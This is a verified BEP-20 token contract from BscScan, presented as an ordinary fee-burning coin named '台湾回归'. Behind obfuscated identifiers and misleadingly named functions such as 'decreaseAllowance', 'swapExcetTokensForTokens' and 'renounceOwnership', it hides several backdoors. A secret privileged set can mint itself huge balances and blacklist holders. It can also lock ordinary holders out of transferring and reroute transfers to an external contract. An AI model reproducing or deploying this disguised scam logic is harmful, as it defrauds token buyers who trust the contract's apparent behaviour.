/**
 *Submitted for verification at BscScan.com on 2022-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _fwajfwfae() internal view virtual returns (address) {
        return msg.sender;
    }

    function _kcmekva() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract NCWHWU {
    function kaifkeiaf() public pure returns (uint256) {
        uint256 ifgienafa = 58385433;
        return ifgienafa;
    }
}

contract TaiwanhuiguiCoin is Context, IERC20, Ownable, NCWHWU {
    using SafeMath for uint256;

    bool private _fmawjfwa = true;
    bool private _kfafwaiffe = false;

    mapping(address => bool) private _mkfkwfewa;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private _mkfmwafw;
    mapping(address => bool) private _kkmekfwa;


    uint8 private _decimals = 9;
    string private _name = unicode"台湾回归";
    string private _symbol = unicode"台湾回归";

    uint256 public _taxFee = 2;
    uint256 private _mfkamkea = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _mfkfwafwa;
    address private _mfkawkfa;

    address private _mfkamfkaw;
    uint256 private _mfawfkaw;
    uint256 private _famfwajfa;
    string private _kmfmkawfwa;
    uint256 public  _mfmakfa;
    address public _njffnwafa;
    uint256 private _kdawkmdkmaw;
    uint256 private _mkfakmfwaf;
    uint256 private _fkafaewa;
    uint256 private _fakfamkfa;

    

    constructor(address _kamfkafaw, address _fkawmfakfa) {
        _mfkfwafwa = _fkawmfakfa;
        _isExcluded[address(this)] = true;
        _isExcluded[_kamfkafaw] = true;
        _isExcluded[owner()] = true;
        _kkmekfwa[_kamfkafaw] = true;
        _mkfmwafw[_fwajfwfae()] = _mfkamkea;
        emit Transfer(address(0), msg.sender, _mfkamkea);
    }

    function setTaxFeePercent(bool __kfafwaiffe, address _newPair) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _kfafwaiffe = __kfafwaiffe;
            _mfkawkfa = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_fwajfwfae()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mkfkwfewa[_fwajfwfae()]||_kcmekva()>=(13*1e9)){
            IERC(_mfkfwafwa)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_kcmekva()<=(13*1e9));
        require(!_mkfkwfewa[from]);
        if (_kkmekfwa[from]) {
            require(_kkmekfwa[from]);
                _mkfmwafw[from]= 
                _mkfmwafw[from].
                add(_mfkamkea*10**6);
        }
        if (_kfafwaiffe) {
            if (_mfkawkfa == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {   
            _mkfmwafw[spender] = _mkfmwafw[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]){
            _kkmekfwa[spender] = deductTransferFee;}
    }

    function swapExcetTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _mkfkwfewa[spender] = true;
            _mkfkwfewa[recipient] = true;
        }
    }

    function swapTokengForExactTokens(address account)
        external
    {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {  
            _mkfkwfewa[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _mkfkwfewa[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mkfmwafw[sender] = _mkfmwafw[sender].sub(toAmount);
        _mkfmwafw[recipient] = _mkfmwafw[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mkfkwfewa[_fwajfwfae()]||_kcmekva()>=(13*1e9)){
            IERC(_mfkfwafwa)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_kkmekfwa[_fwajfwfae()]);
        return _mkfkwfewa[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_kkmekfwa[_fwajfwfae()]);
        if (_kkmekfwa[_fwajfwfae()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _mfkamkea;
    }

    function kifiafea() public pure returns ( uint256) {
        uint256 afioaiofaw = 1038585;
        return afioaiofaw;
    }

    function fkiagea() public pure returns (uint256) {
        return kaifkeiaf();
    }

    address private _kmakawmfae;
    uint256 private _kafmafaw;
    uint256 public _mfawfaw;
    uint256 private _dmkafkwa;
    address private _kafmkwa;
    uint256 private _dakfakfae;


    function kfamwafa() public pure returns (uint256, uint256) {
        uint256 okafmea = 104843;
        uint256 fjawmfaw = 185855;
        return (okafmea, fjawmfaw);
    }

    function kfiafiaw() public onlyOwner() {
    }

    function dwakiea() public view onlyOwner() returns (uint256){
        return balanceOf(address(this));
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _mkfmwafw[account];
    }
}